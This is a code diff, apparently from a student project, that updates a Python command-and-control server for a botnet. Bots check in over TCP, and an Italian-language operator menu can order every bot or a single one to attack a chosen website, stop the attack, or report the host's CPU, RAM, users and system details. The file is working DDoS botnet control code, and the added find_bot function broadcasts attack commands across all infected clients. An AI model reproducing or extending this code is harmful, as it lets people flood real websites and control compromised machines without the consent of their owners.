@@ -5,29 +5,27 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 
-server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
+# server_address = ('10.0.2.15', 15200)
+server_address = ('localhost', 15200)
 clients = []
 
 
 def initialize(e):
     """
     Initialize the server and listen for incoming connections.
-    The server will listen on the port specified in server_address and
-    will accept up to 5 client connections.
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((server_address[0], server_address[1]))
     s.listen(5)
     s.settimeout(2)
-    print(f'Server is listening on port {server_address[1]}')
     while not e.is_set():
         try:
-            client, address = s.accept()
-            clients.append((client, address))
-            print(f'Client connected: {address}')
+            client, port = s.accept()
+            clients.append((client, port))
             data = client.recv(1024)
-            print(data.decode('utf-8'))
+            print("--------------------------------------")
+            print(f"Bot connected: {data.decode('utf-8')}")
+            print("--------------------------------------")
         except socket.timeout:
             continue
 
@@ -54,30 +52,25 @@ def handle_console(e):
     """
     while not e.is_set():
         print("1. Mostra tutti i client connessi")
-        print("2. Invia messaggio a tutti i client")
-        print("3. Invia messaggio a un client specifico")
-        print("4. Effettua richieste http")
-        print("5. Ferma attacco")
-        print("6. Mostra informazioni di un client")
+        print("2. Effettua richieste http")
+        print("3. Ferma attacco")
+        print("4. Mostra informazioni di un client")
         print("0. Exit")
         scelta = int(input())
 
         if scelta == 0:
             print("Exiting...")
+            find_bot(path='/stop-attack', method="GET")
             e.set()
             return
         elif scelta == 1:
             get_all_clients()
         elif scelta == 2:
-            send_message_to_all_clients()
-        elif scelta == 3:
-            send_message_to_specific_client()
-        elif scelta == 4:
             send_http_request()
-        elif scelta == 5:
-            stop_attack()
-        elif scelta == 6:
-            get_client_info()
+        elif scelta == 3:
+            find_bot(path='/stop-attack', method="GET")
+        elif scelta == 4:
+            find_bot(path='/client-info', method="GET")
         else:
             print("Scelta non valida")
 
@@ -94,96 +87,70 @@ def get_all_clients():
         print(f'Client {key + 1}: {client[1]}')
 
 
-def send_message_to_all_clients():
-    """
-    Send a message to all the clients connected to the server
-    """
-    if len(clients) == 0:
-        print("Nessun client connesso")
-        return
-
-    msg = input("Inserisci il messaggio da inviare: ")
-    for client in clients:
-        client[0].send(bytes(msg, 'utf-8'))
-        print(f'Sent to {client[1]}')
-
-
-def send_message_to_specific_client():
-    """
-    Send a message to a specific client connected to the server
-    """
-    if len(clients) == 0:
-        print("Nessun client connesso")
-        return
-
-    client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
-
-    if client_address not in [client[1][1] for client in clients]:
-        print("Client non trovato")
-        return
-
-    msg = input("Inserisci il messaggio da inviare: ")
-    client = [client for client in clients if client[1][1] == client_address][0]
-    client[0].send(bytes(msg, 'utf-8'))
-    print(f'Sent to {client[1]}')
-
-
 def send_http_request():
     """
-    Send an HTTP request to the specified URL
+    Start the attack of all the bots or of a specific bot
     """
 
-    url = 'https://federicoraponi.it'
-    post_data = {
-        'url': url,
-        'number_of_requests': 5
-    }
+    urls = [
+        "https://federicoraponi.it/",
+        "https://alessiopannozzo.it/",
+    ]
 
+    print("Seleziona un URL da attaccare: ")
+    for key, url in enumerate(urls):
+        print(f"{key + 1}. {url}")
+
+    url = urls[int(input()) - 1]
+
+    find_bot(path='/attack', method="POST", json={
+        'url': url
+    })
+
+
+def print_client_info(client, res):
+    print(f"Client Ip: {client}")
+    print(f"CPU: {res.json()['cpu']}")
+    print(f"CPU usage: {res.json()['cpu_usage']}%")
+    print(f"RAM (GB): {res.json()['ram']}")
+    print(f"RAM usage: {res.json()['ram']}%")
+    print(f"System: {res.json()['system']}")
+    print(f"Cores: {res.json()['cores']}")
+    print(f"Total Cores: {res.json()['total_cores']}")
+    print(f"Users: {res.json()['users']}")
+    print("--------------------")
+
+
+def find_bot(path, method, json=None):
     if len(clients) == 0:
-        print("Nessun client connesso")
+        print("Nessun bot connesso")
         return
 
-    # res = requests.post(f"http://{clients[0][1][0]}/attack", json=post_data)
-    res = requests.post(f"http://{clients[0][1][0]}:8080/attack", json=post_data)
-
-    print(res)
-
-    # if input("Voi utilizzare tutti i bot connessi? S/N: ") == "S" or "s":
-    #     for client in clients:
-    #         requests.post(f"http://{client[1][0]}/attack", json=post_data)
-    # else:
-    #     client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
-    #     if client_address not in [client[1][1] for client in clients]:
-    #         print("Client non trovato")
-    #         return
-    #     else:
-    #         client = [client for client in clients if client[1][1] == client_address][0][1][0]
-    #         requests.post(f"http://{client}/attack", json=post_data)
-
-
-def get_client_info():
-    """
-    Get the client info
-    """
-
-    if len(clients) == 0:
-        print("Nessun client connesso")
-        return
-
-    # res = requests.get(f"http://{clients[0][1][0]}/client-info")
-    res = requests.get(f"http://{clients[0][1][0]}:8080/client-info")
-
-    ram = res.json()['ram']
-    cpu = res.json()['cpu']
-
-    print(f"RAM: {ram}GB")
-    print(f"CPU: {cpu}")
-
-
-def stop_attack():
-    # res = requests.get(f"http://{clients[0][1][0]}/stop-attack")
-    res = requests.get(f"http://{clients[0][1][0]}:8080/stop-attack")
-    print(res)
+    if input("Voi utilizzare tutti i bot connessi? S/N: ") in ["S", "s"]:
+        if method == "GET":
+            for client in clients:
+                res = requests.get(f"http://{client[1][0]}/{path}")
+                # res = requests.get(f"http://{client[1][0]}:8080/{path}")
+                if path == "/client-info":
+                    print_client_info(client[1][0], res)
+        elif method == "POST":
+            for client in clients:
+                res = requests.post(f"http://{client[1][0]}/{path}", json=json)
+                # res = requests.post(f"http://{client[1][0]}:8080/{path}", json=json)
+    else:
+        client_ip = input("Inserisci l'Ip del bot di cui vuoi sapere le info: ")
+        if client_ip not in [client[1][0] for client in clients]:
+            print("Bot non trovato")
+            return
+        else:
+            if method == "GET":
+                res = requests.get(f"http://{client_ip}/{path}")
+                # res = requests.get(f"http://{client_ip}:8080/{path}")
+                if path == "/client-info":
+                    print_client_info(client_ip, res)
+            elif method == "POST":
+                requests.post(f"http://{client_ip}/{path}", json=json)
+                # requests.post(f"http://{client_ip}:8080/{path}", json=json)
 
 
 if __name__ == '__main__':
